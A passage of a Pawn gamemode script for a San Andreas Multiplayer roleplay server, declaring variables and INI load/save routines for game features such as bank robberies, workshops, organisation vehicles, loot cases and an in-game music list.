new astronautKey[MAX_PLAYERS];
new astronautPopravkaBroj[MAX_PLAYERS];

////////////////////////////////////////

new TrcanjeVarijabla[MAX_PLAYERS];

new helperVeh[MAX_PLAYERS];
// new Text3D:helperLabel[MAX_PLAYERS];

new VPVeh[MAX_PLAYERS];
// new Text3D:VPLabel[MAX_PLAYERS];

new bool:zaposljavanjeDelay[MAX_PLAYERS];

////////////////////////////////////////


////////////////////////////////////////

new bankaHackingZona;

new BankaCuvar;
new bool:BankaOrobana;
new bool:BankaUToku;
new bool:RobaBanku[MAX_PLAYERS];
new bool:PostaviBusilicu[MAX_PLAYERS];
new BusilicaTime[MAX_PLAYERS];
new Timer:TimerRobBanka;
new bool:PokupiTorbu[MAX_PLAYERS];
new Busilica[3];
new BankaSef[5];
new NosiBankaTorbu[MAX_PLAYERS];
new NovacBanka[10];
new BombaTatice[MAX_PLAYERS];
new bool:UBanci[MAX_PLAYERS];
new TorbaBankaPickup;
new PlayerText:BankaBusilicaTD[MAX_PLAYERS][4];

new Float:RandomSahte[6][3] =
{
    {1523.2170,-1191.4794,23.8450},
    {1617.8984,-994.4554,24.0670},
    {1520.9397,-969.8616,36.5628},
    {1293.4557,-990.5220,32.6953},
    {1522.2638,-1664.5452,13.5757},
    {1365.7897,-1289.0082,13.5469}
};

////////////////////////////////////////

#define MAX_ORG_POEN            200

////////////////////////////////////////

new bool:helperUsed[MAX_PLAYERS];

////////////////////////////////////////

new bool:listenFamily[MAX_PLAYERS];

//////////////////////////////////////////////////////////////////////////////////

new KaznaIgraca[MAX_PLAYERS];

//////////////////////////////////////////////////////////////////////////////////

new bool:inFirstPerson[MAX_PLAYERS]; 
new firstPerson[MAX_PLAYERS]; 

//////////////////////////////////////////////////////////////////////////////////

new bool:igracKrvari[MAX_PLAYERS];
new krvarenjeMode[MAX_PLAYERS];
new krvarenjeCount[MAX_PLAYERS];
new PlayerText:krvarenjeTD[MAX_PLAYERS][2];

/////////////////////////////////////////////////////////////////////////////////

#define USE_SMOOTH_TURNS // thanks to richardcor91 for the SetVehicleAngularVelocity help

#define vehicleSpeed        (0.3) //Najbolje ne dirati ( brzina neka id od 0.1 do 0.8 )
////////////////////////////////////////////////////////////////////////////////
new autopilotID[MAX_PLAYERS] = {-1,...};
new CurrTarget[MAX_PLAYERS] = {0,...};
new TimerAutoPilot[MAX_PLAYERS] = {-1,...};
#if defined USE_TIMERS
new interval[MAX_PLAYERS] = {250,...};
#endif

new bool:checkpointCheck[MAX_PLAYERS];
////////////////////////////////////////////////////////////////////////////////

forward Float:atan2VehicleZ(Float:Xb,Float:Yb,Float:Xe,Float:Ye);

enum location
{
    imeMesta[32],
    Float:pilotX,
    Float:pilotY,
    Float:pilotZ
}

#define PLACES (12)
new places[PLACES][location] =
{
    { "Opstina",1480.1237,-1730.6149,13.3828 },
    { "Banka",1576.2202,-1134.4020,23.4654 },
    { "Zlatara",1086.682250,-1714.232421,13.381875 },
    { "Apoteka",1296.3700,-1849.2474,13.3828 },
    { "Electronic Store", 917.1982,-1522.5040,13.3828 }, // Electronic Store
    { "Rolex Store", 1799.5590,-1266.9280,13.4688 }, // Rolex
    { "Skate Park", 1850.9160,-1379.3253,13.3906 }, // SkatePark
    { "AutoSkola", 1960.9844,-1872.0428,13.3828 }, // AutoSkola
    { "AutoSalon", 916.3643,-1718.9456,13.3828 }, // AutoSalon
    { "Stock Market", 590.5104,-1229.2626,17.7623 }, // StockMarket
    { "Burg", 1217.8350,-938.6843,42.6571 }, // Burg
    { "Policija", 1202.5382,-1387.7439,13.1916 } // Policija
};

/////////////////////////////////////////////////////////////////////////////////

new balonObjekat;
new balonPozicija;

////////////////////////////////////////////////////////////////////////////////

#define MODE_SKATE (1)        // 0 - medium speed | 1 - fast speed
#define TYPE_SKATE (1)        // 0 - the skate is placed on the right arm | 1 - the skate is placed in the back
#define INDEX_SKATE (8)       //is the slot that used SetPlayerAttachedObject
enum skate{
    bool:sActive,
    sSkate,
};
new InfoSkate[MAX_PLAYERS][skate];

//////////////////////////////////////////////////////////////////////////////// Dinamicne Nargile

enum nargilaInfo {
 
    Float:nargilaPosX,
    Float:nargilaPosY,
    Float:nargilaPosZ,
    Float:nargilaRotX,
    Float:nargilaRotY,
    Float:nargilaRotZ,
    bool:IznamljenaNargila,
    IznajmioNargilu,
    nargilaID
}
 
new NargilaInfo[ 20 ][ nargilaInfo ], Text3D:NargilaLabel[ sizeof(NargilaInfo) ], KreiraNargilu[ MAX_PLAYERS ], NargiluIznajmio[ MAX_PLAYERS ], NargilaDim[ sizeof(NargilaInfo) ], UvukoDim[ MAX_PLAYERS ],
    NargilaTimer[ MAX_PLAYERS ];

forward OcitajNargilu(id, name[], value[]);
public OcitajNargilu(id, name[], value[]) {
    INI_Float("Lokacija_X", NargilaInfo[ id ][ nargilaPosX ]);
    INI_Float("Lokacija_Y", NargilaInfo[ id ][ nargilaPosY ]);
    INI_Float("Lokacija_Z", NargilaInfo[ id ][ nargilaPosZ ]);
    INI_Float("Rotacija_X", NargilaInfo[ id ][ nargilaRotX ]);
    INI_Float("Rotacija_Y", NargilaInfo[ id ][ nargilaRotY ]);
    INI_Float("Rotacija_Z", NargilaInfo[ id ][ nargilaRotZ ]);
    return 1;
}

forward DimNargile(id); public DimNargile(id) { DestroyObject(NargilaDim[ id ]); return 1; }

forward UnrentNargila(playerid);
public UnrentNargila(playerid) {
 
    new i = NargiluIznajmio[ playerid ];
    Update3DTextLabelText(NargilaLabel[ i ], 0xFFFFFFFF, "/nargila\nNije iznamljena.");
    NargilaInfo[ i ][ IznajmioNargilu ] = -1;
    NargilaInfo[ i ][ IznamljenaNargila ] = false;
    NargiluIznajmio[ playerid ] = 0;
    SendClientMessage(playerid, -1, "Vise ne iznamljujete nargilu.");
    return 1;
}

stock NextNargilaID(const len) {
    new id = (-1);
    for( new loop = ( 0 ), provjera = ( -1 ), Data_[ 64 ] = "\0"; loop != len; ++ loop ) {
       provjera = ( loop+1 );
       format( Data_, ( sizeof Data_ ), "/Nargile/%d.ini", provjera );
       if(!fexist(Data_)) {
          id = ( provjera );
          break; } }
    return ( id );
}

SaveNargila(id) {
    new nFile[ 60 ];
    format(nFile, sizeof(nFile), "/Nargile/%d.ini", id);
    new INI:File = INI_Open(nFile);
    INI_WriteFloat(File, "Lokacija_X", NargilaInfo[ id ][ nargilaPosX ]);
    INI_WriteFloat(File, "Lokacija_Y", NargilaInfo[ id ][ nargilaPosY ]);
    INI_WriteFloat(File, "Lokacija_Z", NargilaInfo[ id ][ nargilaPosZ ]);
    INI_WriteFloat(File, "Rotacija_X", NargilaInfo[ id ][ nargilaRotX ]);
    INI_WriteFloat(File, "Rotacija_Y", NargilaInfo[ id ][ nargilaRotY ]);
    INI_WriteFloat(File, "Rotacija_Z", NargilaInfo[ id ][ nargilaRotZ ]);
    INI_Close(File);
}

stock GetNearestNargila( playerid ) {
    for( new b = 0; b < sizeof(NargilaInfo); b++) {
        if( IsPlayerInRangeOfPoint( playerid, 3.0, NargilaInfo[b][nargilaPosX], NargilaInfo[b][nargilaPosY], NargilaInfo[b][nargilaPosZ ] ) ) return b; }
    return -1;
}

////////////////////////////////////////////////////////////////////////////////

new vojnik2Enemy1;
new vojnik2Enemy2;
new vojnik2Enemy3;
new vojnik2Boss;
new vojnik2Pomocni;
new vojnik2EnemyT1;
new vojnik2EnemyT2;

new vojnik2Veh1;
new vojnik2Veh2;

new bool:radiVojnik2[MAX_PLAYERS];
new vojnik2CP[MAX_PLAYERS];
new vojnik2Veh[MAX_PLAYERS];
new GeneralTimer2[MAX_PLAYERS];
new vojnik2Obj[MAX_PLAYERS];
new bool:Ubio1[MAX_PLAYERS];
new bool:Ubio2[MAX_PLAYERS];

////////////////////////////////////////////////////////////////////////////////

new PlayerText:BuyGunTD[MAX_PLAYERS][6];

new chooseGun[MAX_PLAYERS];

////////////////////////////////////////////////////////////////////////////////

new pornoActor;
new bool:KrevetUpotreba;

new PlayerBar:PornoBar[MAX_PLAYERS];

new Float:pornoProgress[MAX_PLAYERS];
new bool:radiPorno[MAX_PLAYERS];
new pornoCooldown[MAX_PLAYERS];

////////////////////////////////////////////////////////////////////////////////

new bool:radiLovac[MAX_PLAYERS];
new PlayerBar:lovacBar[MAX_PLAYERS];
new lovacCounter[MAX_PLAYERS];

////////////////////////////////////////////////////////////////////////////////

new Text:HappyJobTD[3];

////////////////////////////////////////////////////////////////////////////////

new bool:requestStrike[MAX_PLAYERS] = false,
    requestStrikeTime[MAX_PLAYERS] = 0,
    requestStrikeTimer[MAX_PLAYERS] = 0,
    bool:strikeReady[MAX_PLAYERS] = false,
    StrikeObject[MAX_PLAYERS] = -1;

new Timer:strikeMapTimer;

new highLightID[MAX_PLAYERS];

////////////////////////////////////////////////////////////////////////////////

// new snowobj[MAX_PLAYERS];
// new Float:snowX,Float:snowY,Float:snowZ;

////////////////////////////////////////////////////////////////////////////////

new room[MAX_PLAYERS], stfloor[MAX_PLAYERS], ndfloor[MAX_PLAYERS], turn[MAX_PLAYERS] = 0;

////////////////////////////////////////////////////////////////////////////////

new AchivementList[][] = {

    "Izvadi Pasos/Licnu Kartu",
    "Zaposli Se",
    "Postani clan organizacije",
    "Zauzmi Teritoriju",
    "Zavrsi Misiju",
    "Odradi uspesnu prodaju droge Favellama",
    "Prodaj Bitcoin",
    "Izleci nekog sa medkitom",
    "Koristi Kran",
    "Kupi Kucu",
    "Kupi Auto",
    "Kupi Firmu",
    "Kupi deonicu u Stock Marketu",
    "Pozovi AirDrop",
    "Otvori Case",
    "Poseti Lost City",
    "Poseti Floridu"
};

new PlayerText:AchivementsTD[MAX_PLAYERS][17];

////////////////////////////////////////////////////////////////////////////////

#define players MAX_PLAYERS //maximum of players in your server
#define chopperid 497 //ID of the vehicle model ( http://wiki.sa-mp.com/wiki/Vehicles:Helicopters )
#define ropelength 80 //length of slideable rope (ingame meters)
#define skinid 285 //the skin, who may slide down the rope ( http://wiki.sa-mp.com/wiki/Skins:All )
 
#define offsetz 12
#define dur 250
 
new r0pes[players][ropelength],Float:pl_pos[players][5]; //cause pvar + array = sux

////////////////////////////////////////////////////////////////////////////////

new PlayerText:BankaTD[MAX_PLAYERS][21];

#define     BankaX                  1010.6830
#define     BankaY                  1868.4153
#define     BankaZ                  1203.5000

new bool:bankaTDShown[MAX_PLAYERS] = false;

////////////////////////////////////////////////////////////////////////////////

#define MAX_AIRDROPS 1000

enum AirDropEnum {

    Float:airPosition[3],
    airObjID,
    airData
};
new airdropData[ MAX_AIRDROPS ][ AirDropEnum ];
new Text3D:airdropLabel[MAX_AIRDROPS];

new PlayerText:AirDropTD[MAX_PLAYERS][17];
new bool:AirDropShown[MAX_PLAYERS] = false;

new bool:airdropActive[MAX_PLAYERS] = false;

////////////////////////////////////////////////////////////////////////////////

new deoniceKupovna;
new deoniceProdajna;

////////////////////////////////////////////////////////////////////////////////

new PlayerText:HackingTD[MAX_PLAYERS][21];
new playerHacking[MAX_PLAYERS] = 0;
new playerHackingSifra[MAX_PLAYERS] = 0;
new bool:playerHackingNosi[MAX_PLAYERS] = false;

new BrokerActor;

////////////////////////////////////////////////////////////////////////////////

new PlayerText:OpenCaseTD[MAX_PLAYERS][25];
new bool:OpenCaseShown[MAX_PLAYERS] = false;

#define highpos 700
#define BULLET $
#define INFERNUS $
#define LEVELUP2 ~ 
#define LEVELUP1 ~
#define RP10 e
#define RP40 e
#define HIDDEN ^
#define PREMIUMP10 €
#define CASH650 !
#define CASH320 !

new ReceivedItem[MAX_PLAYERS],SpinInterval[MAX_PLAYERS] = 0,
PlayerCaseOBJ[210][MAX_PLAYERS],Float:PlayerCaseX[MAX_PLAYERS] = 0.0,
PlayerProb[MAX_PLAYERS],CaseDrop[][]=
{
    " ",
    "VIP 3",
    "VIP 1",
    "2x Level UP",
    "1x Level UP",
    "+ $15.000",
    "+ $5.000",
    "Donatorske Boje",
    "+ 10 g",
    "+ 4 respect",
    "+ 2 respect"
};

////////////////////////////////////////////////////////////////////////////////

new PlayerText:Novac_Info[MAX_PLAYERS];

////////////////////////////////////////////////////////////////////////////////

// enum RouteInformation
// {
//     Destination,
//     CreatedObjects[1024],
//     bool:calculating,
//     Lenght
// };
// new PlayerRoute[MAX_PLAYERS][RouteInformation];

////////////////////////////////////////////////////////////////////////////////

new PlayerBar:RanjenBar[MAX_PLAYERS];
new Float:PodizanjeVreme[MAX_PLAYERS];

////////////////////////////////////////////////////////////////////////////////

#define misijePosX          984.0812
#define misijePosY          -1551.6519
#define misijePosZ          22.9322

new radiMisiju[MAX_PLAYERS] = 0;
new misijaCounter[MAX_PLAYERS] = 0;
new bool:misijaNosi[MAX_PLAYERS] = false;
new bool:misijaVraca[MAX_PLAYERS] = false;

new misijaActor1;

new misijaPDActor;
new misijaUbistvo[MAX_PLAYERS];

////////////
new misijaKradja[MAX_PLAYERS] = 0;
new misijaLaptop[MAX_PLAYERS] = 0;
new misijaEnemy1, misijaEnemy2, misijaEnemy3;

////////////////////////////////////////////////////////////////////////////////

new bool:RanjenIgrac[MAX_PLAYERS] = false;
new RanjenIgracCount[MAX_PLAYERS] = 0;
new Timer:RanjenIgracTimer;

new Text:PozadinaTD;

////////////////////////////////////////////////////////////////////////////////

// encode_lights(light1, light2, light3, light4) return light1 | (light2 << 1) | (light3 << 2) | (light4 << 3);
// encode_doors(bonnet, boot, driver_door, passenger_door)return bonnet | (boot << 8) | (driver_door << 16) | (passenger_door << 24);
// encode_panels(flp, frp, rlp, rrp, windshield, front_bumper, rear_bumper) return flp | (frp << 4) | (rlp << 8) | (rrp << 12) | (windshield << 16) | (front_bumper << 20) | (rear_bumper << 24);

////////////////////////////////////////////////////////////////////////////////

new bool:SkoroPucao[MAX_PLAYERS] = false;

////////////////////////////////////////////////////////////////////////////////
new gLastDriver[ MAX_VEHICLES ],
    Neon[ MAX_VEHICLES ],
    VehicleWindows[ MAX_VEHICLES ],
    Text3D:vehicle3Dtext[ MAX_VEHICLES ],
    CarSign[ MAX_VEHICLES ],
    bool:occupied[ MAX_VEHICLES ] = false,
    Fuel[ MAX_VEHICLES ],
    FuelTime[ MAX_VEHICLES ],
    vCanDrive[ MAX_VEHICLES ],
    Siren[MAX_VEHICLES],
    SirenObject[MAX_VEHICLES],
    bool:sljunak[ MAX_VEHICLES ],
    bool:VehCement[ MAX_VEHICLES ],
    bool:WOOD[ MAX_VEHICLES ],
    WOODObject[ MAX_VEHICLES ],
    NeonObject1[ MAX_VEHICLES ],
    NeonObject2[ MAX_VEHICLES ];

//===============================[ WORKSHOP by V01D ]===========================
new NosiVozilo[MAX_PLAYERS] = 0;
new KupioVozilo[MAX_PLAYERS] = 0;
new WorkShopVeh[MAX_PLAYERS] = -1;
new WorkShopVehTow[MAX_PLAYERS] = -1;
new WorkShopBuyModel[MAX_PLAYERS] = 0;
new WorkShopBuyPrice[MAX_PLAYERS] = 0;
new bool:WorkShopBuyTow[MAX_PLAYERS] = false;

new SelectedCar[MAX_PLAYERS] = 0;
new WorkShopCarPrice[MAX_PLAYERS] = 0;

#define WorkShop_File     "WorkShops/WorkShop_%d.ini"
#define MAX_WORKSHOPS 100

enum WorkShoping
{
    wVlasnik[MAX_PLAYER_NAME],
    Float:wPosX,
    Float:wPosY,
    Float:wPosZ,
    wBrojAuta,
    wBrojDelova,
    wModel1,
    wModel2,
    wPopravka1,
    wPopravka2,
    wBrojRadnika
};

new WorkShopInfo[MAX_WORKSHOPS][WorkShoping];
new Text3D:WorkShopLabel[sizeof(WorkShopInfo)];
new WorkShopPickup[sizeof(WorkShopInfo)];
new WorkShopActor1[sizeof(WorkShopInfo)];
new WorkShopActor2[sizeof(WorkShopInfo)];

forward LoadWorkShops(id, name[], value[]);
public LoadWorkShops(id, name[], value[])
{
    INI_String("Vlasnik", WorkShopInfo[id][wVlasnik], 45);
    INI_Float("PosX", WorkShopInfo[id][wPosX]);
    INI_Float("PosY", WorkShopInfo[id][wPosY]);
    INI_Float("PosZ", WorkShopInfo[id][wPosZ]);
    INI_Int("BrojAuta", WorkShopInfo[id][wBrojAuta]);
    INI_Int("BrojDelova", WorkShopInfo[id][wBrojDelova]);
    INI_Int("Model1", WorkShopInfo[id][wModel1]);
    INI_Int("Model2", WorkShopInfo[id][wModel2]);
    INI_Int("Popravka1", WorkShopInfo[id][wPopravka1]);
    INI_Int("Popravka2", WorkShopInfo[id][wPopravka2]);
    INI_Int("BrojRadnika", WorkShopInfo[id][wBrojRadnika]);
    return 1;
}

SaveWorkShop(id)
{
    new wFile[40];
    format(wFile, 40, WorkShop_File, id);
    new INI:File = INI_Open(wFile);
    INI_WriteString(File,"Vlasnik", WorkShopInfo[id][wVlasnik]);
    INI_WriteFloat(File, "PosX", WorkShopInfo[id][wPosX]);
    INI_WriteFloat(File, "PosY", WorkShopInfo[id][wPosY]);
    INI_WriteFloat(File, "PosZ", WorkShopInfo[id][wPosZ]);
    INI_WriteInt(File, "BrojAuta", WorkShopInfo[id][wBrojAuta]);
    INI_WriteInt(File, "BrojDelova", WorkShopInfo[id][wBrojDelova]);
    INI_WriteInt(File, "Model1", WorkShopInfo[id][wModel1]);
    INI_WriteInt(File, "Model2", WorkShopInfo[id][wModel2]);
    INI_WriteInt(File, "Popravka1", WorkShopInfo[id][wPopravka1]);
    INI_WriteInt(File, "Popravka2", WorkShopInfo[id][wPopravka2]);
    INI_WriteInt(File, "BrojRadnika", WorkShopInfo[id][wBrojRadnika]);
    INI_Close(File);
    return 1;
}

WorkShopVehicleCheck(id) {

    if(IsValidDynamicActor(WorkShopActor1[id]))
        DestroyDynamicActor(WorkShopActor1[id]);

    if(IsValidDynamicActor(WorkShopActor2[id]))
        DestroyDynamicActor(WorkShopActor2[id]);

    if(WorkShopInfo[id][wModel1] > 0) {

        WorkShopActor1[id] = CreateDynamicActor(50, 1381.9169,-29.4744,1001.0511,271.0633, 1, 100.0, id, -1, -1, STREAMER_ACTOR_SD, -1, 0);
        ApplyDynamicActorAnimation(WorkShopActor1[id], "Bar", "Barserve_bottle", 4.0, 1, 1, 1, 1, -1);
    }

    if(WorkShopInfo[id][wModel2] > 0) {

        WorkShopActor2[id] = CreateDynamicActor(50, 1371.9910,-43.0718,1001.0511,349.6873, 1, 100.0, id, -1, -1, STREAMER_ACTOR_SD, -1, 0);
        ApplyDynamicActorAnimation(WorkShopActor2[id], "Bar", "Barserve_bottle", 4.0, 1, 1, 1, 1, -1);
    }
}

WorkShopLabelUpdate(id) {

    if(IsValidDynamic3DTextLabel(WorkShopLabel[id]))
        DestroyDynamic3DTextLabel(WorkShopLabel[id]);

    if(IsValidDynamicPickup(WorkShopPickup[id]))
        DestroyDynamicPickup(WorkShopPickup[id]);

    new string[180];

    if(strcmp( WorkShopInfo[id][wVlasnik], "Niko", true ))
    {
        format(string, 180, ""col_red"[ "col_white"WORKSHOP"col_red" ]\nVlasnik: "col_white"%s\n"col_red"ID: "col_white"%d"col_red"\nKoristite 'F' Za Ulaz", WorkShopInfo[id][wVlasnik], id);
    }
    else if(!strcmp( WorkShopInfo[id][wVlasnik], "Niko", true ))
    {
        format(string, 180, ""col_green"[ "col_white"WORKSHOP"col_green" ]\nVlasnik: "col_white"%s\n"col_green"ID: "col_white"%d"col_green"\n"col_green"Cena: "col_white"%d"col_green"\n/kupiradionicu", WorkShopInfo[id][wVlasnik], id, RadionicaBuyPrice);
    }
    WorkShopLabel[id] = CreateDynamic3DTextLabel(string, 0x33CCFFAA, WorkShopInfo[id][wPosX], WorkShopInfo[id][wPosY], WorkShopInfo[id][wPosZ], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 30.0, -1, 0);
    WorkShopPickup[id] = CreateDynamicPickup(19524, 1, WorkShopInfo[id][wPosX], WorkShopInfo[id][wPosY], WorkShopInfo[id][wPosZ], -1, -1, -1, 30.0, -1, 0);

}

stock SledeciIDWorkShop(const len) {
    new id = (-1);
    for( new loop = ( 0 ), provjera = ( -1 ), Data_[ 64 ] = "\0"; loop != len; ++ loop ) {
       provjera = ( loop+1 );
       format( Data_, ( sizeof Data_ ), WorkShop_File, provjera );
       if(!fexist(Data_)) {
          id = ( provjera );
          break; } }
    return ( id );
}

GetNearestWorkShop( playerid ) {
    for( new b = 0; b < sizeof(WorkShopInfo); b++) {
        if( IsPlayerInRangeOfPoint( playerid, 3.0, WorkShopInfo[b][wPosX], WorkShopInfo[b][wPosY], WorkShopInfo[b][wPosZ ] ) ) return b; }
    return -1;
}


/////////////////////////////////////////////

new ModelOdabir[MAX_PLAYERS] = 0;

//////////////////////////////////// CIPOVANJE

// new CipRampa;
// new koristiRampu;

// #define STAGE_1 50
// #define STAGE_2 80
// #define STAGE_3 100
// #define STAGE_4 130

//////////////////////////////////// Weapon Cycle Attach 

#define TIME 250 
#define playercommand 
forward Enable(playerid);
forward Disable(playerid);
forward AttachWeapon();
forward HoldingWeaponsForAll(boolean);
new wep[MAX_PLAYERS] = -1, timer, weps[12], d[MAX_PLAYERS] = 1, d1 = 1, camera[MAX_PLAYERS];

////////////////////////////////////
new PlayerText:FavellaProdajaTD[MAX_PLAYERS][5];
new ProdajaFavella = false;
new FavellaVreme;
new ProdajeKokain[MAX_PLAYERS] = 0;

new FavellaNovacPickup;
new FavellaPickup;
new Timer:FavellaPickupTimer;

new UmroKoks[MAX_PLAYERS] = 0;

new ProdajeKokainRange[MAX_PLAYERS] = 0;
new NosiFavella[MAX_PLAYERS] = 0;

////////////////////////////////////

new OdabranaOrgBoja[MAX_PLAYERS];

new OrgVehBroj[MAX_PLAYERS];
new OrgVehID[MAX_PLAYERS];

new KreiraOrgVehPickup[MAX_PLAYERS];

new OrgVeh[MAX_PLAYERS];
// new Text3D:OrgVehLabelIgrac[MAX_PLAYERS];

#define ORGVEH_FILE         "OrgVozila/Vozilo_%d.ini"

#define MAX_ORGVEH 30

enum OrgVehPickupInfo {

    Float:oVehPosX,
    Float:oVehPosY,
    Float:oVehPosZ,
    oVehModel1,
    oVehModel2,
    oVehModel3,
    oVehModel4,
    oVehModel5,
    oVehKolicina1,
    oVehKolicina2,
    oVehKolicina3,
    oVehKolicina4,
    oVehKolicina5,
    oVehOrgID,
    Float:oVehSpawnX,
    Float:oVehSpawnY,
    Float:oVehSpawnZ,
    oVehColor
}

new OrgVehInfo[MAX_ORGVEH][OrgVehPickupInfo];
new OrgVehPickup[sizeof(OrgVehInfo)];
new Text3D:OrgVehLabel[sizeof(OrgVehInfo)];

forward UcitajOrgVehPickup(idpickup, name[], value[]);
public UcitajOrgVehPickup(idpickup, name[], value[])
{
    INI_Float("X", OrgVehInfo[idpickup][oVehPosX]);
    INI_Float("Y", OrgVehInfo[idpickup][oVehPosY]);
    INI_Float("Z", OrgVehInfo[idpickup][oVehPosZ]);
    INI_Int("Model1", OrgVehInfo[idpickup][oVehModel1]);
    INI_Int("Model2", OrgVehInfo[idpickup][oVehModel2]);
    INI_Int("Model3", OrgVehInfo[idpickup][oVehModel3]);
    INI_Int("Model4", OrgVehInfo[idpickup][oVehModel4]);
    INI_Int("Model5", OrgVehInfo[idpickup][oVehModel5]);
    INI_Int("Kolicina1", OrgVehInfo[idpickup][oVehKolicina1]);
    INI_Int("Kolicina2", OrgVehInfo[idpickup][oVehKolicina2]);
    INI_Int("Kolicina3", OrgVehInfo[idpickup][oVehKolicina3]);
    INI_Int("Kolicina4", OrgVehInfo[idpickup][oVehKolicina4]);
    INI_Int("Kolicina5", OrgVehInfo[idpickup][oVehKolicina5]);
    INI_Int("OrgID", OrgVehInfo[idpickup][oVehOrgID]);
    INI_Float("SpawnX", OrgVehInfo[idpickup][oVehSpawnX]);
    INI_Float("SpawnY", OrgVehInfo[idpickup][oVehSpawnY]);
    INI_Float("SpawnZ", OrgVehInfo[idpickup][oVehSpawnZ]);
    INI_Int("VehColor", OrgVehInfo[idpickup][oVehColor]);
    return 1;
}

SacuvajOrgVehPickup(idpickup)
{
    new fFile[128];
    format(fFile, 128, ORGVEH_FILE, idpickup);
    new INI:File = INI_Open(fFile);

    INI_WriteFloat(File, "X", OrgVehInfo[idpickup][oVehPosX]);
    INI_WriteFloat(File, "Y", OrgVehInfo[idpickup][oVehPosY]);
    INI_WriteFloat(File, "Z", OrgVehInfo[idpickup][oVehPosZ]);
    INI_WriteInt(File, "Model1", OrgVehInfo[idpickup][oVehModel1]);
    INI_WriteInt(File, "Model2", OrgVehInfo[idpickup][oVehModel2]);
    INI_WriteInt(File, "Model3", OrgVehInfo[idpickup][oVehModel3]);
    INI_WriteInt(File, "Model4", OrgVehInfo[idpickup][oVehModel4]);
    INI_WriteInt(File, "Model5", OrgVehInfo[idpickup][oVehModel5]);
    INI_WriteInt(File, "Kolicina1", OrgVehInfo[idpickup][oVehKolicina1]);
    INI_WriteInt(File, "Kolicina2", OrgVehInfo[idpickup][oVehKolicina2]);
    INI_WriteInt(File, "Kolicina3", OrgVehInfo[idpickup][oVehKolicina3]);
    INI_WriteInt(File, "Kolicina4", OrgVehInfo[idpickup][oVehKolicina4]);
    INI_WriteInt(File, "Kolicina5", OrgVehInfo[idpickup][oVehKolicina5]);
    INI_WriteInt(File, "OrgID", OrgVehInfo[idpickup][oVehOrgID]);
    INI_WriteFloat(File, "SpawnX", OrgVehInfo[idpickup][oVehSpawnX]);
    INI_WriteFloat(File, "SpawnY", OrgVehInfo[idpickup][oVehSpawnY]);
    INI_WriteFloat(File, "SpawnZ", OrgVehInfo[idpickup][oVehSpawnZ]);
    INI_WriteInt(File, "VehColor", OrgVehInfo[idpickup][oVehColor]);
    INI_Close(File);
    return 1;
}

OrgVehPickupLabel(orgveh) {

    new string[220];

    if(IsValidDynamic3DTextLabel(OrgVehLabel[orgveh]))
        DestroyDynamic3DTextLabel(OrgVehLabel[orgveh]);

    if(IsValidDynamicPickup(OrgVehPickup[orgveh]))
        DestroyDynamicPickup(OrgVehPickup[orgveh]);

    format(string, 220, ""col_crvena"[ ORG VOZILA ]\n"col_crvena"[ %s ]\n"col_crvena"ID: "SRVBOJA1SCM"%d\n"col_crvena"[ /orgveh ]", getOrgName(OrgVehInfo[orgveh][oVehOrgID]),orgveh);
    OrgVehLabel[orgveh] = CreateDynamic3DTextLabel(string, 0x33CCFFAA, OrgVehInfo[orgveh][oVehPosX], OrgVehInfo[orgveh][oVehPosY], OrgVehInfo[orgveh][oVehPosZ], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 30.0, -1, 0);
    OrgVehPickup[orgveh] = CreateDynamicPickup(1650, 1, OrgVehInfo[orgveh][oVehPosX], OrgVehInfo[orgveh][oVehPosY], OrgVehInfo[orgveh][oVehPosZ], -1, -1, -1, 80.0, -1, 0);

    return 1;
}


////////////////////////////////////
new Music[][] =
{
    "https://audio.jukehost.co.uk/3QkygHK6AsK3spFMRg82pq8m5T2dVvuk", "Samo Bob - Nemacki Policajci",
    "https://audio.jukehost.co.uk/nU88lBwMa07hA3Y4b1W5EXcgJp1xFUro", "Samo Bob - Crni Sin",
    "https://audio.jukehost.co.uk/Ejana3IUhLuxPniqJkRpvXkrqDzn82s2", "Mahdi - Bar Bar",
    "https://audio.jukehost.co.uk/spA927OQtYeVxZAFwEJ4Q0Vyqqsj8ZPa", "Mimi Mercedes - Samo kes",
    "https://audio.jukehost.co.uk/CJLdx3veIXDh28Musjy8kXrOM9NOpBw2", "Rimski - 200",
    "https://audio.jukehost.co.uk/pwPTOAD6R2YGOeSX6zUzwdXNc2rebulW", "Nucci - Vroom",
    "https://audio.jukehost.co.uk/qv5a36Uo4kaoYrJsv2Cd99jZKMO8fu12", "Relja - Pakao od Zene",
    "https://audio.jukehost.co.uk/JMgdd6N158FMzK0pgzZBb0oGPLLfKoGK", "Amir Grand - A jesam te volio",
    "https://audio.jukehost.co.uk/EVAspZ2Vi1lrsOQPwd3LkWAhxic2meNh", "Relja - Made in Balkan",
    "https://audio.jukehost.co.uk/6WiWEvGYdSYkHbZYjXBwQraZCB68Ewwy", "In Vivo - Akcent",
    "https://audio.jukehost.co.uk/ZcFAzJCC8lPdQjJx41ERqHLiteozxdn0", "Stoja - Do gole koze",
    "https://audio.jukehost.co.uk/XGvet4pFVgJB6fDSwzmqA9ESRaLC3xWD", "Jala Brat x Buba Corelli - O.D.D.D.",
    "https://audio.jukehost.co.uk/2cIi3yQDd7WGAFf1mjJ1sjXiAUBHTWIT", "Krtina - Tpe Za Ske"

};

////////////////////////////////////
new BitcoinCena[MAX_PLAYERS];

#define BITCOIN_FILE   "BitCoinWorkShop/%d.ini"
#define MAX_BTCW 5000

enum Workshops
{
    bVlasnik[MAX_PLAYER_NAME],
    bNovac,
    bMasine,
    Float:bUlazX,
    Float:bUlazY,
    Float:bUlazZ,
    Float:bIzlazX,
    Float:bIzlazY,
    Float:bIzlazZ,
    bPokvareno
};
new BitcoinInfo[MAX_BTCW][Workshops];
new BitCoinPickup[sizeof(BitcoinInfo)];
new Text3D:BitCoinSafeLabel[sizeof(BitcoinInfo)];
new Text3D:BitCoinLabel[sizeof(BitcoinInfo)];

forward UcitajBTCWorkShop(id, name[], value[]);
public UcitajBTCWorkShop(id, name[], value[])
{
    INI_String("Vlasnik", BitcoinInfo[id][bVlasnik], 45);
    INI_Int("Novac", BitcoinInfo[id][bNovac]);
    INI_Int("Masine", BitcoinInfo[id][bMasine]);
    INI_Float("UlazX", BitcoinInfo[id][bUlazX]);
    INI_Float("UlazY", BitcoinInfo[id][bUlazY]);
    INI_Float("UlazZ", BitcoinInfo[id][bUlazZ]);
    INI_Float("IzlazX", BitcoinInfo[id][bIzlazX]);
    INI_Float("IzlazY", BitcoinInfo[id][bIzlazY]);
    INI_Float("IzlazZ", BitcoinInfo[id][bIzlazZ]);
